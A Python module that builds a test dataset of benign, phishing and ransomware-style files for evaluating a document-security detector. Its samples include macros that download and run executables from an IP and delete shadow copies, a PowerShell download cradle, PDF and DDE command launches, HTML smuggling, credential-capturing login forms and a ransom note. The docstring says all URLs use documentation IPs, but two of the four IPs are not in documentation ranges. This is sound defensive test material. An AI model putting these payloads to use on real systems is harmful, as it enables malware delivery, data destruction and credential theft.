"""Generador del dataset de seguridad (archivos legítimos, phishing y ransomware).

IMPORTANTE: todas las muestras "maliciosas" son **inertes**. Reproducen los
*indicadores* que busca el protocolo (macros con AutoOpen, acciones
/JavaScript, ejecutables disfrazados, enlaces de suplantación, notas de
rescate…) pero no contienen código funcional: los "ejecutables" son
cabeceras MZ incompletas, el VBA es texto dentro de un contenedor y las
URLs apuntan a dominios reservados o IP de documentación. Es el mismo enfoque
que el archivo de prueba EICAR. Nada de esto se ejecuta nunca.

Se incluyen casos difíciles a propósito (documentos legítimos con macros de
formato, PDF legítimos con /OpenAction, avisos de cobro reales con palabras
urgentes, phishing con un solo indicador) para medir falsos positivos y
negativos de forma honesta (RNF3/RNF4).
"""
from __future__ import annotations

import base64
import io
import random
import zipfile
from pathlib import Path

from ..ai.dataset import generate_text, render, to_docx, to_pdf
from ..domain.models import CATEGORIES

EXE_STUB = (b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"\x00" * 44 +
            b"\x80\x00\x00\x00" + b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21" +
            b"This program cannot be run in DOS mode.\r\r\n$" + b"\x00" * 7 + b"PE\x00\x00")
DOC_NAMES = ["factura_pendiente", "acta_obra_{n}", "presupuesto_final", "orden_compra_{n}",
             "comprobante_pago", "contrato_firmado", "informe_interventoria", "planos_via",
             "cuenta_cobro_{n}", "soporte_transferencia", "citacion_dian", "estado_cuenta"]

PHISH_DOMAINS = [
    "bancolombia-seguridad.xyz", "davivienda-verificacion.top", "dian-notificaciones.click",
    "nequi.soporte-app.live", "login-microsoft365.support", "whatsapp-verify.monster",
    "xn--bancolmbia-9db.com", "secure-bbva-co.icu", "paypal.account-update.cyou",
    "portal.proveedores-vichada.shop", "office365.docs-share.buzz",
]
PHISH_IPS = ["185.244.25.14", "45.137.21.9", "203.0.113.55", "198.51.100.23"]
SHORT = ["bit.ly/3xYk9Qp", "tinyurl.com/fac-2026", "cutt.ly/pago", "rb.gy/a8k2x"]
LEGIT_URLS = ["https://www.bancolombia.com/personas", "https://www.dian.gov.co/facturacion",
              "https://www.ucc.edu.co", "https://www.invias.gov.co", "https://www.office.com",
              "https://www.villavicencio.gov.co", "https://www.meta.gov.co", "http://www.secop.gov.co"]
PHISH_LINES = [
    "Su cuenta ha sido suspendida por actividad inusual.", "Verifique su cuenta en las próximas 24 horas.",
    "Ingrese su contraseña y clave dinámica para evitar el bloqueo.", "Haga clic aquí para descargar la factura.",
    "Actualice sus datos bancarios de inmediato.", "Tiene un pago pendiente, evite la suspensión.",
    "Confirme su identidad con el código de verificación.", "Usted ha sido seleccionado para recibir un premio.",
    "Factura vencida: consulte el documento en el siguiente enlace.", "Urgente: el proveedor cambió su cuenta bancaria.",
]
BUSINESS_URGENT = [
    "Urgente: enviar el acta firmada antes del viernes.", "Recordatorio de pago pendiente de la factura FE-{n}.",
    "Factura vencida hace 5 días, favor gestionar con tesorería.", "Se requiere de inmediato el informe de avance.",
]
VBA_BENIGN = """Attribute VB_Name = "Module1"
Sub FormatearTabla()
    Selection.Tables(1).Style = "Tabla con cuadrícula"
    Range("A1:D20").Font.Bold = True
End Sub
Sub InsertarFecha()
    Selection.TypeText Text:=Format(Date, "dd/mm/yyyy")
End Sub"""
VBA_MALICIOUS = [
    """Attribute VB_Name = "ThisDocument"
Sub AutoOpen()
    Dim s As String
    s = StrReverse("exe.llehsrewop") & " -w hidden -enc " & Chr(74) & Chr(65)
    CreateObject("WScript.Shell").Run s, 0
End Sub""",
    """Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", "http://{ip}/f.bin", False
    x.Send
    Set st = CreateObject("ADODB.Stream")
    st.SaveToFile Environ("TEMP") & "\\upd.exe", 2
    Shell Environ("TEMP") & "\\upd.exe"
End Sub""",
    """Attribute VB_Name = "Module2"
Sub Document_Open()
    Shell "cmd.exe /c vssadmin delete shadows /all /quiet", vbHide
    CallByName CreateObject("WScript.Shell"), "Run", VbMethod, "bcdedit /set recoveryenabled no"
End Sub""",
]
RANSOM_NOTE = """¡ATENCIÓN! Sus archivos han sido cifrados.
Todos sus documentos, fotos y bases de datos fueron bloqueados con cifrado fuerte.
Para descifrar sus archivos debe pagar el rescate de 0.{n} bitcoin a la billetera indicada.
Descargue Tor Browser y visite http://ransomxyz{n}abcd.onion
Si no paga en 72 horas la clave privada para recuperar sus datos será destruida."""


def _name(rng, ext):
    return rng.choice(DOC_NAMES).format(n=rng.randint(10, 999)) + "." + ext


def _zip_add(docx_bytes: bytes, entries: dict[str, bytes], rels_extra: str | None = None) -> bytes:
    src = zipfile.ZipFile(io.BytesIO(docx_bytes))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        for item in src.infolist():
            data = src.read(item)
            if rels_extra and item.filename == "word/_rels/settings.xml.rels":
                data = rels_extra.encode()
            z.writestr(item, data)
        for n, d in entries.items():
            z.writestr(n, d)
        if rels_extra and "word/_rels/settings.xml.rels" not in src.namelist():
            z.writestr("word/_rels/settings.xml.rels", rels_extra)
    return out.getvalue()


def _pdf_with_objects(text: str, objs: dict[str, str], objstm: bool = False, hex_obf: bool = False) -> bytes:
    """PDF real con acciones añadidas. objs = {"OpenAction": "<< ... >>", ...} sobre el catálogo."""
    import pymupdf
    doc = pymupdf.open(stream=to_pdf(text), filetype="pdf")
    cat = doc.pdf_catalog()
    for key, val in objs.items():
        x = doc.get_new_xref()
        doc.update_object(x, val)
        doc.xref_set_key(cat, key, f"{x} 0 R")
    data = doc.tobytes(garbage=1, deflate=True, use_objstms=1 if objstm else 0)
    if hex_obf:
        data = data.replace(b"/JavaScript", b"/J#61vaScr#69pt").replace(b"/OpenAction", b"/Open#41ction")
    return data


def _ole_doc(vba: str, rng) -> bytes:
    body = bytearray(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504)
    body += "Documento de Microsoft Word 97-2003 ".encode("utf-16-le")
    body += b"\x00" * rng.randint(200, 2000)
    body += b"_VBA_PROJECT\x00" + b"V\x00B\x00A\x00" + vba.encode("latin-1")
    body += bytes(rng.getrandbits(8) for _ in range(rng.randint(1000, 5000)))
    return bytes(body)


def _png(rng) -> bytes:
    import pymupdf
    pix = pymupdf.Pixmap(pymupdf.csRGB, pymupdf.IRect(0, 0, rng.randint(40, 120), rng.randint(40, 120)), False)
    pix.set_rect(pix.irect, (rng.randint(0, 255), rng.randint(0, 255), rng.randint(0, 255)))
    return pix.tobytes("png")


def _jpg(rng) -> bytes:
    import pymupdf
    pix = pymupdf.Pixmap(pymupdf.csRGB, pymupdf.IRect(0, 0, 64, 64), False)
    pix.set_rect(pix.irect, (rng.randint(0, 255), 120, 60))
    return pix.tobytes("jpg")


# --------------------------------------------------------------------- legítimos
def legit_sample(rng: random.Random) -> tuple[str, bytes, str]:
    kind = rng.choices(["doc", "url_oficial", "macro_benigna", "pdf_openaction", "imagen", "urgente_real",
                        "acortador_legit"], [50, 12, 6, 6, 10, 10, 6])[0]
    cat = rng.choice(CATEGORIES)
    text = generate_text(cat, rng)
    if kind == "doc":
        fmt = rng.choice(["pdf", "docx", "xlsx", "pptx", "txt"])
        return _name(rng, fmt), render(text, fmt), kind
    if kind == "url_oficial":
        text += "\nMás información: " + " ".join(rng.sample(LEGIT_URLS, rng.randint(1, 3)))
        fmt = rng.choice(["pdf", "docx"])
        return _name(rng, fmt), render(text, fmt), kind
    if kind == "macro_benigna":
        data = _zip_add(to_docx(text), {"word/vbaProject.bin": b"\xd0\xcf\x11\xe0" + VBA_BENIGN.encode()})
        return _name(rng, "docm"), data, kind
    if kind == "pdf_openaction":  # p. ej. PDF exportado que abre en una página/zoom concreto
        return _name(rng, "pdf"), _pdf_with_objects(text, {"OpenAction": "[3 0 R /FitH 800]"}), kind
    if kind == "imagen":
        if rng.random() < 0.5:
            return f"IMG-2026{rng.randint(1000, 9999)}-WA00{rng.randint(10, 99)}.jpg", _jpg(rng), kind
        return f"foto_obra_{rng.randint(1, 300)}.png", _png(rng), kind
    if kind == "urgente_real":
        text += "\n" + rng.choice(BUSINESS_URGENT).format(n=rng.randint(100, 999))
        if rng.random() < 0.5:
            text += "\n" + rng.choice(BUSINESS_URGENT).format(n=rng.randint(100, 999))
        fmt = rng.choice(["pdf", "docx", "txt"])
        return _name(rng, fmt), render(text, fmt), kind
    text += f"\nInscripciones al curso de seguridad vial: https://{rng.choice(SHORT)}"
    return _name(rng, "pdf"), render(text, "pdf"), kind


# ---------------------------------------------------------------------- phishing
def phishing_sample(rng: random.Random) -> tuple[str, bytes, str]:
    kind = rng.choices(["completo", "sutil", "html_login", "solo_enlace", "suplantacion_marca"],
                       [35, 20, 12, 13, 20])[0]
    dom = rng.choice(PHISH_DOMAINS)
    ip = rng.choice(PHISH_IPS)
    base = rng.choice(["Estimado cliente,", "Señor proveedor,", "Apreciado usuario,", "Constructora Vichada S.A.S."])
    if kind == "completo":
        lines = [base] + rng.sample(PHISH_LINES, rng.randint(2, 4)) + [
            f"Ingrese aquí: https://{dom}/login/verificar?id={rng.randint(1000, 99999)}",
            rng.choice([f"http://{ip}/cuenta/actualizar", f"https://{rng.choice(SHORT)}", ""])]
        fmt = rng.choice(["pdf", "docx"])
        return _name(rng, fmt), render("\n".join(lines), fmt), kind
    if kind == "sutil":  # un solo indicador fuerte, texto casi normal
        text = generate_text(rng.choice(["Facturas", "Informes", "Contratos"]), rng)
        text += "\n" + rng.choice(PHISH_LINES) + f"\nConsulte el soporte en https://{rng.choice(SHORT)}"
        fmt = rng.choice(["pdf", "docx"])
        return _name(rng, fmt), render(text, fmt), kind
    if kind == "html_login":
        html = f"""<!DOCTYPE html><html><head><title>Bancolombia - Sucursal Virtual</title></head>
<body><h2>Verifique su cuenta</h2><p>{rng.choice(PHISH_LINES)}</p>
<form action="http://{ip}/post.php" method="post">Usuario <input name="u"> Clave <input type="password" name="p">
<button>Ingresar</button></form><script>var d=unescape('%68%74%74%70');eval(atob('YWxlcnQoMSk='));</script></body></html>"""
        return _name(rng, rng.choice(["html", "htm"])), html.encode(), kind
    if kind == "solo_enlace":
        text = f"{base}\nDocumento compartido contigo.\nVer documento: https://{dom}/doc/{rng.randint(1, 9999)}\n" \
               f"Si no puede verlo, descargue aquí: http://{ip}/descargar"
        return _name(rng, "pdf"), render(text, "pdf"), kind
    brand = rng.choice(["Bancolombia", "DIAN", "Nequi", "Microsoft 365", "WhatsApp"])
    text = (f"{brand} - Notificación oficial\n{rng.choice(PHISH_LINES)}\n{rng.choice(PHISH_LINES)}\n"
            f"Acceda a https://{dom}/{brand.lower().replace(' ', '')}/secure-login")
    fmt = rng.choice(["pdf", "docx", "pptx"])
    return _name(rng, fmt), render(text, fmt), kind


# -------------------------------------------------------------------- ransomware
def ransomware_sample(rng: random.Random) -> tuple[str, bytes, str]:
    kind = rng.choices(["docm_autoopen", "ole_macro", "pdf_js", "pdf_launch", "pdf_objstm", "pdf_hex",
                        "doble_extension", "exe_disfrazado", "plantilla_remota", "dde", "nota_rescate",
                        "powershell_b64", "exe_embebido"],
                       [14, 8, 10, 7, 6, 5, 10, 8, 7, 6, 7, 6, 6])[0]
    ip = rng.choice(PHISH_IPS)
    text = generate_text(rng.choice(["Facturas", "Contratos", "Financiero", "Informes"]), rng)
    if kind == "docm_autoopen":
        vba = rng.choice(VBA_MALICIOUS).replace("{ip}", ip)
        data = _zip_add(to_docx(text + "\nHabilite el contenido para ver el documento."),
                        {"word/vbaProject.bin": b"\xd0\xcf\x11\xe0" + vba.encode()})
        name = _name(rng, "docm")
        if rng.random() < 0.3:  # macro disfrazada con extensión .docx
            name = name[:-1] + "x"
        return name, data, kind
    if kind == "ole_macro":
        return _name(rng, rng.choice(["doc", "xls"])), _ole_doc(rng.choice(VBA_MALICIOUS).replace("{ip}", ip), rng), kind
    js = rng.choice([f"app.launchURL('http://{ip}/p.exe', true);",
                     "var p=unescape('%u9090%u9090');var s=String.fromCharCode(101,118,97,108);this.exportDataObject({cName:'f.exe',nLaunch:2});",
                     "util.printf('%45000f', 1); eval(unescape('%61%70%70'));"])
    if kind == "pdf_js":
        return _name(rng, "pdf"), _pdf_with_objects(text, {"OpenAction": f"<< /S /JavaScript /JS ({js}) >>"}), kind
    if kind == "pdf_launch":
        return _name(rng, "pdf"), _pdf_with_objects(text, {"OpenAction": "<< /S /Launch /Win << /F (cmd.exe) /P (/c powershell -enc SQBFAFgA) >> >>"}), kind
    if kind == "pdf_objstm":
        return _name(rng, "pdf"), _pdf_with_objects(text, {"OpenAction": f"<< /S /JavaScript /JS ({js}) >>"}, objstm=True), kind
    if kind == "pdf_hex":
        return _name(rng, "pdf"), _pdf_with_objects(text, {"OpenAction": f"<< /S /JavaScript /JS ({js}) >>"}, hex_obf=True), kind
    if kind == "doble_extension":
        name = _name(rng, rng.choice(["pdf", "docx", "xlsx"])) + rng.choice([".exe", ".scr", ".bat", ".js", ".vbs"])
        if rng.random() < 0.3:
            name = name.replace(".", " " * 8 + ".", 1) if rng.random() < 0.5 else name
        payload = EXE_STUB + bytes(rng.getrandbits(8) for _ in range(rng.randint(2000, 20000))) \
            if name.endswith((".exe", ".scr")) else b"WScript.Shell ... cmd /c vssadmin delete shadows\n"
        return name, payload, kind
    if kind == "exe_disfrazado":
        name = _name(rng, rng.choice(["pdf", "docx", "jpg", "xlsx"]))
        if rng.random() < 0.3:
            name = name.rsplit(".", 1)[0] + "\u202efdp.exe"   # truco RTLO
        return name, EXE_STUB + bytes(rng.getrandbits(8) for _ in range(rng.randint(2000, 20000))), kind
    if kind == "plantilla_remota":
        rels = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                f'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                f'Target="http://{ip}/plantilla.dotm" TargetMode="External"/></Relationships>')
        return _name(rng, "docx"), _zip_add(to_docx(text), {}, rels_extra=rels), kind
    if kind == "dde":
        d = to_docx(text)
        z = zipfile.ZipFile(io.BytesIO(d))
        xml = z.read("word/document.xml").decode()
        xml = xml.replace("</w:body>", '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>'
                          ' DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k powershell -w hidden" </w:instrText></w:r>'
                          '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body>')
        out = io.BytesIO()
        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zo:
            for it in z.infolist():
                zo.writestr(it, xml if it.filename == "word/document.xml" else z.read(it))
        return _name(rng, "docx"), out.getvalue(), kind
    if kind == "nota_rescate":
        note = RANSOM_NOTE.format(n=rng.randint(1, 9))
        fmt = rng.choice(["txt", "pdf", "html"])
        data = note.encode() if fmt in ("txt", "html") else render(note, "pdf")
        return rng.choice(["LEEME_RECUPERAR", "COMO_DESCIFRAR", "README_DECRYPT"]) + "." + fmt, data, kind
    if kind == "powershell_b64":
        cmd = f"IEX (New-Object Net.WebClient).DownloadString('http://{ip}/a.ps1')"
        enc = base64.b64encode(cmd.encode("utf-16-le")).decode()
        text += f"\npowershell.exe -NoP -W Hidden -enc {enc}"
        fmt = rng.choice(["docx", "txt", "pdf"])
        return _name(rng, fmt), render(text, fmt), kind
    # exe_embebido: ejecutable (inerte) escondido en base64 dentro de un documento
    blob = base64.b64encode(EXE_STUB + bytes(rng.getrandbits(8) for _ in range(3000))).decode()
    return _name(rng, "docx"), _zip_add(to_docx(text), {"word/media/image9.bin": blob.encode()}), kind


def spoofed_extension_set(rng: random.Random | None = None) -> list[tuple[str, bytes, str]]:
    """Conjunto para la prueba RF4: >=10 archivos con extensión falsificada a propósito."""
    rng = rng or random.Random(7)
    d = to_docx("Documento de prueba")
    return [
        ("factura_pendiente.pdf", EXE_STUB + b"\x00" * 512, "exe"),
        ("contrato.docx", EXE_STUB + b"\x00" * 512, "exe"),
        ("foto_obra.jpg", EXE_STUB + b"\x00" * 512, "exe"),
        ("presupuesto.xlsx", to_pdf("presupuesto"), "pdf"),
        ("acta.pdf", d, "docx"),
        ("plano.pdf", _png(rng), "png"),
        ("informe.docx", _zip_add(d, {"word/vbaProject.bin": b"\xd0\xcf\x11\xe0AutoOpen"}), "docm"),
        ("soporte.pdf", b"<!DOCTYPE html><html><body>login</body></html>", "html"),
        ("imagen.png", b"#!/bin/sh\necho hola\n", "script"),
        ("reporte.docx", _ole_doc(VBA_BENIGN, rng), "ole"),
        ("tabla.csv", EXE_STUB, "exe"),
        ("presentacion.pptx", _jpg(rng), "jpg"),
    ]


def generate_security_dataset(out_dir: Path, n_legit=360, n_phish=170, n_ransom=170, seed=13):
    rng = random.Random(seed)
    out_dir = Path(out_dir)
    items = []
    for label, n, fn in (("legitimo", n_legit, legit_sample), ("phishing", n_phish, phishing_sample),
                         ("ransomware", n_ransom, ransomware_sample)):
        (out_dir / label).mkdir(parents=True, exist_ok=True)
        for i in range(n):
            name, data, kind = fn(rng)
            safe = name.replace("/", "_").replace("\u202e", "[RTLO]")
            p = out_dir / label / f"{i:04d}__{kind}__{safe}"
            p.write_bytes(data)
            items.append({"path": p.relative_to(out_dir).as_posix(), "name": name, "label": label, "kind": kind})
    return items


# ============================================================ controles de ciberseguridad
# Muestras (también inertes) de técnicas que el dataset original no cubre: comprimidos
# anidados, con contraseña o bombas, políglotas, RTF con objetos OLE, PDF con adjuntos o
# JavaScript en el árbol de nombres, macros Excel 4.0, contrabando HTML, accesos directos…
# Sirven para medir los controles de security/controls.py sin reentrenar el modelo.
EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
INERT_JS = b'// Muestra inerte de FileMind: solo imprime un texto.\r\nWScript.Echo("prueba");\r\n'


def _zip(entries: list[tuple[str, bytes]], encrypted: bool = False, level: int = 6) -> bytes:
    """ZIP en memoria. ``encrypted`` marca las entradas como cifradas (bit 0 del
    indicador de propósito general), como hace un ZIP con contraseña."""
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED, compresslevel=level) as z:
        for n, d in entries:
            z.writestr(n, d)
    data = bytearray(out.getvalue())
    if encrypted:
        i = 0
        while (i := data.find(b"PK\x03\x04", i)) >= 0:
            data[i + 6] |= 1
            i += 4
        i = 0
        while (i := data.find(b"PK\x01\x02", i)) >= 0:
            data[i + 8] |= 1
            i += 4
    return bytes(data)


def _rtf_object(class_name: bytes, payload: bytes) -> bytes:
    """RTF con un objeto OLE 1.0 incrustado (\\object \\objemb … \\objdata)."""
    import struct
    ole1 = (struct.pack("<II", 0x00000501, 2) + struct.pack("<I", len(class_name) + 1) + class_name + b"\x00"
            + struct.pack("<I", 0) + struct.pack("<I", 0) + struct.pack("<I", len(payload)) + payload)
    return (b"{\\rtf1\\ansi{\\fonttbl{\\f0 Arial;}}\\f0 Documento de soporte de pago.\\par"
            b"{\\object\\objemb{\\*\\objclass " + class_name + b"}\\objw2000\\objh400{\\*\\objdata "
            + ole1.hex().encode() + b"}}}")


def _package(filename: str, payload: bytes) -> bytes:
    """Flujo OLE «Package» (OLENativeStream) que envuelve un archivo con su nombre."""
    import struct
    fn = filename.encode("latin-1") + b"\x00"
    src = ("C:\\Users\\Public\\" + filename).encode("latin-1") + b"\x00"
    return (struct.pack("<H", 2) + fn + src + struct.pack("<II", 0, 0) + src
            + struct.pack("<I", len(payload)) + payload)


def _lnk(rng) -> bytes:
    hdr = bytes([0x4C, 0, 0, 0, 0x01, 0x14, 0x02, 0x00, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46])
    return hdr + bytes(56) + "C:\\Windows\\System32\\cmd.exe /c echo prueba".encode("utf-16-le") \
        + bytes(rng.getrandbits(8) for _ in range(200))


def _pdf_embed(text: str, name: str, payload: bytes) -> bytes:
    import pymupdf
    doc = pymupdf.open(stream=to_pdf(text), filetype="pdf")
    doc.embfile_add(name, payload, filename=name)
    return doc.tobytes(garbage=1, deflate=True)


def _pdf_js_names(text: str, js: str) -> bytes:
    import pymupdf
    doc = pymupdf.open(stream=to_pdf(text), filetype="pdf")
    x = doc.get_new_xref()
    doc.update_object(x, f"<< /S /JavaScript /JS ({js}) >>")
    doc.xref_set_key(doc.pdf_catalog(), "Names", f"<< /JavaScript << /Names [(inicio) {x} 0 R] >> >>")
    return doc.tobytes(garbage=1, deflate=True)


def control_attack_sample(kind: str, rng: random.Random) -> tuple[str, bytes]:
    ip = rng.choice(PHISH_IPS)
    text = generate_text(rng.choice(["Facturas", "Contratos", "Financiero", "Informes"]), rng)
    exe = EXE_STUB + bytes(rng.getrandbits(8) for _ in range(rng.randint(2000, 8000)))
    if kind == "zip_exe":
        return _name(rng, "zip"), _zip([(_name(rng, "pdf") + ".exe", exe)])
    if kind == "zip_anidado":
        inner = _zip([("comprobante_pago.js", INERT_JS)])
        for _ in range(2):
            inner = _zip([("soporte.zip", inner)])
        return _name(rng, "zip"), inner
    if kind == "zip_contrasena":
        return _name(rng, "zip"), _zip([(rng.choice(["Factura_0425.js", "pago.vbs", "factura.pdf.exe"]),
                                         INERT_JS)], encrypted=True)
    if kind == "zip_bomba":
        zeros = bytes(80 * 1024 * 1024)
        return _name(rng, "zip"), _zip([("datos1.bin", zeros), ("datos2.bin", zeros)], level=9)
    if kind == "zip_macro":
        vba = rng.choice(VBA_MALICIOUS).replace("{ip}", ip)
        docm = _zip_add(to_docx(text), {"word/vbaProject.bin": b"\xd0\xcf\x11\xe0" + vba.encode()})
        return _name(rng, "zip"), _zip([(_name(rng, "docm"), docm)])
    if kind == "zip_ruta":
        return _name(rng, "zip"), _zip([("factura.pdf", to_pdf(text)),
                                         ("../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/actualizar.bat",
                                          b"@echo off\r\necho prueba\r\n")])
    if kind == "zip_eicar":
        return _name(rng, "zip"), _zip([("documento.com", EICAR)])
    if kind == "poliglota_jpg_zip":
        return f"IMG-2026{rng.randint(1000, 9999)}-WA00{rng.randint(10, 99)}.jpg", _jpg(rng) + _zip([("abrir.vbs", INERT_JS)])
    if kind == "pdf_adjunto_exe":
        return _name(rng, "pdf"), _pdf_embed(text, "Factura_electronica.pdf.exe", exe)
    if kind == "pdf_js_nombres":
        return _name(rng, "pdf"), _pdf_js_names(text, f"app.launchURL('http://{ip}/p.exe', true);")
    if kind == "rtf_equation":
        return _name(rng, "doc"), _rtf_object(b"Equation.3", bytes(rng.getrandbits(8) for _ in range(600)))
    if kind == "rtf_paquete":
        return _name(rng, "rtf"), _rtf_object(b"Package", _package("factura.exe", exe))
    if kind == "html_contrabando":
        b64 = base64.b64encode(exe).decode()
        html = (f"<!DOCTYPE html><html><head><title>Factura electrónica</title></head><body><p>Descargando su factura…</p>"
                f"<script>var b=atob('{b64}');var a=new Uint8Array(b.length);for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);"
                f"var f=new Blob([a],{{type:'application/octet-stream'}});var l=document.createElement('a');"
                f"l.href=URL.createObjectURL(f);l.download='Factura.pdf.exe';</script></body></html>")
        return _name(rng, "html"), html.encode()
    if kind == "html_enlace_enganoso":
        html = (f"<!DOCTYPE html><html><head><title>Notificación DIAN</title></head><body><p>Estimado contribuyente,</p>"
                f"<p>Consulte su citación en <a href=\"http://{ip}/dian/consulta\">https://www.dian.gov.co/citaciones</a>.</p>"
                f"<iframe src=\"http://{ip}/t\" width=\"0\" height=\"0\" style=\"display:none\"></iframe></body></html>")
        return _name(rng, "html"), html.encode()
    if kind == "excel4_xlm":
        sheet = (b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><xm:macrosheet xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main">'
                 b'<sheetData><row r="1"><c r="A1"><f>EXEC("cmd /c echo prueba")</f></c></row><row r="2"><c r="A2"><f>HALT()</f></c></row></sheetData></xm:macrosheet>')
        from ..ai.dataset import render as _render
        base = _render(text, "xlsx")
        out = io.BytesIO()
        with zipfile.ZipFile(io.BytesIO(base)) as src, zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
            for it in src.infolist():
                z.writestr(it, src.read(it))
            z.writestr("xl/macrosheets/sheet1.xml", sheet)
        return _name(rng, "xlsx"), out.getvalue()
    if kind == "lnk_disfrazado":
        return _name(rng, "pdf"), _lnk(rng)
    raise ValueError(kind)


def control_legit_sample(kind: str, rng: random.Random) -> tuple[str, bytes]:
    text = generate_text(rng.choice(CATEGORIES), rng)
    if kind == "zip_factura_electronica":   # como envía la DIAN: PDF + XML de la factura
        xml = (f'<?xml version="1.0" encoding="UTF-8"?><Invoice><ID>FE-{rng.randint(100, 9999)}</ID>'
               f'<IssueDate>2026-09-{rng.randint(10, 28)}</IssueDate><Total>{rng.randint(10, 999)}000</Total></Invoice>').encode()
        return _name(rng, "zip"), _zip([("factura.pdf", to_pdf(text)), ("factura.xml", xml)])
    if kind == "zip_contrasena_legit":
        return _name(rng, "zip"), _zip([("nomina_septiembre.pdf", to_pdf(text))], encrypted=True)
    if kind == "zip_fotos":
        return "fotos_obra.zip", _zip([(f"IMG_{i}.jpg", _jpg(rng)) for i in range(4)])
    if kind == "pdf_adjunto_xml":
        return _name(rng, "pdf"), _pdf_embed(text, "factura.xml", b'<?xml version="1.0"?><Invoice><ID>1</ID></Invoice>')
    if kind == "docx_con_excel":
        from ..ai.dataset import render as _render
        return _name(rng, "docx"), _zip_add(to_docx(text), {"word/embeddings/Microsoft_Excel_Worksheet.xlsx":
                                                            _render("tabla de cantidades", "xlsx")})
    if kind == "html_boletin":
        html = (f"<!DOCTYPE html><html><head><title>Boletín de obra</title></head><body><h1>Boletín</h1><p>{text[:400]}</p>"
                f"<p>Más información en <a href=\"https://www.invias.gov.co\">www.invias.gov.co</a></p></body></html>")
        return _name(rng, "html"), html.encode()
    if kind == "rtf_simple":
        return _name(rng, "rtf"), b"{\\rtf1\\ansi{\\fonttbl{\\f0 Arial;}}\\f0 " + text[:500].encode("latin-1", "ignore") + b"\\par}"
    raise ValueError(kind)


CONTROL_ATTACKS = ["zip_exe", "zip_anidado", "zip_contrasena", "zip_bomba", "zip_macro", "zip_ruta", "zip_eicar",
                   "poliglota_jpg_zip", "pdf_adjunto_exe", "pdf_js_nombres", "rtf_equation", "rtf_paquete",
                   "html_contrabando", "html_enlace_enganoso", "excel4_xlm", "lnk_disfrazado"]
CONTROL_LEGIT = ["zip_factura_electronica", "zip_contrasena_legit", "zip_fotos", "pdf_adjunto_xml",
                 "docx_con_excel", "html_boletin", "rtf_simple"]


def generate_control_dataset(out_dir: Path, per_kind: int = 4, seed: int = 29) -> list[dict]:
    """Dataset de evaluación de los controles: ``per_kind`` muestras por técnica."""
    rng = random.Random(seed)
    out_dir = Path(out_dir)
    items = []
    for label, kinds, fn in (("malicioso", CONTROL_ATTACKS, control_attack_sample),
                             ("legitimo", CONTROL_LEGIT, control_legit_sample)):
        (out_dir / label).mkdir(parents=True, exist_ok=True)
        for kind in kinds:
            for i in range(per_kind if kind != "zip_bomba" else 1):
                name, data = fn(kind, rng)
                p = out_dir / label / f"{kind}__{i}__{name}"
                p.write_bytes(data)
                items.append({"path": p.relative_to(out_dir).as_posix(), "name": name, "label": label, "kind": kind})
    return items
